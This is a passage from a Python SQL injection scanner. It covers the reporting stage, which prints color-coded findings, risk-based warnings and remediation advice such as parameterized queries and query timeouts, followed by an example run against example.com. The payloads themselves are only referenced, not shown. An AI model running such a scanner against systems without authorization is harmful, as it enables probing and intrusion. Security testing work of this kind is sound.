        recommendations = self.generate_recommendations(results)
        if recommendations:
            print(f"\n{self.colors['header']}💡 RECOMMENDATIONS:")
            print(f"{self.colors['separator']}{'-'*95}")
            
            for i, rec in enumerate(recommendations, 1):
                priority_color = {
                    'critical': Back.RED + Fore.WHITE,
                    'high': Fore.RED + Style.BRIGHT,
                    'medium': Fore.YELLOW + Style.BRIGHT,
                    'low': Fore.BLUE + Style.BRIGHT
                }.get(rec['priority'], Fore.WHITE)
                
                print(f"{priority_color}{i}. [{rec['priority'].upper()}] {rec['title']}")
                print(f"{self.colors['info']}   {rec['description']}")
                print()
        
        # Final status
        if results['vulnerabilities']:
            if results['risk_score'] > 70:
                print(f"{self.colors['critical']}⚠ CRITICAL SQL INJECTION VULNERABILITIES DETECTED! Immediate action required.")
            elif results['risk_score'] > 40:
                print(f"{self.colors['warning']}⚠ SQL injection vulnerabilities found. Review and fix immediately.")
            else:
                print(f"{self.colors['warning']}⚠ Potential SQL injection issues found. Further investigation recommended.")
        else:
            print(f"{self.colors['success']}✅ No SQL injection vulnerabilities detected.")
        
        print(f"{self.colors['separator']}{'='*95}\n")

    def generate_recommendations(self, results):
        """Generate targeted recommendations"""
        recommendations = []
        
        if results['vulnerabilities']:
            recommendations.append({
                'priority': 'critical',
                'title': 'Fix SQL Injection Vulnerabilities',
                'description': f'Implement parameterized queries or prepared statements for {len(results["vulnerabilities"])} vulnerable parameters'
            })
        
        # Check for specific vulnerability types
        vuln_types = set(v.get('type') for v in results['vulnerabilities'])
        
        if 'Error-based SQL Injection' in vuln_types:
            recommendations.append({
                'priority': 'high',
                'title': 'Disable Error Messages',
                'description': 'Disable detailed database error messages in production environment'
            })
        
        if 'Time-based Blind SQL Injection' in vuln_types:
            recommendations.append({
                'priority': 'high',
                'title': 'Implement Query Timeouts',
                'description': 'Set maximum execution time for database queries'
            })
        
        # General recommendations
        recommendations.extend([
            {
                'priority': 'high',
                'title': 'Use Parameterized Queries',
                'description': 'Always use prepared statements or parameterized queries instead of string concatenation'
            },
            {
                'priority': 'medium',
                'title': 'Input Validation',
                'description': 'Implement strict input validation and sanitization for all user inputs'
            },
            {
                'priority': 'medium',
                'title': 'Web Application Firewall',
                'description': 'Deploy a WAF to detect and block SQL injection attempts'
            },
            {
                'priority': 'low',
                'title': 'Regular Security Testing',
                'description': 'Perform regular security scans and penetration testing'
            }
        ])
        
        return sorted(recommendations, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}[x['priority']])

# Example usage
if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    
    # Run scan
    target_url = "http://example.com/page.php?id=1"
    results = scanner.scan(target_url)
    
    # Additional statistics
    total_payloads = sum(len(payloads) for category in scanner.payloads.values() 
                        for db_payloads in category.values() 
                        for payloads in db_payloads)
    
    print(f"\n{Fore.CYAN}Scanner Statistics:")
    print(f"{Fore.CYAN}• Total payloads: {total_payloads}")
    print(f"{Fore.CYAN}• Database types: {len(scanner.db_error_patterns)}")
    print(f"{Fore.CYAN}• Techniques: {len(scanner.payloads)}")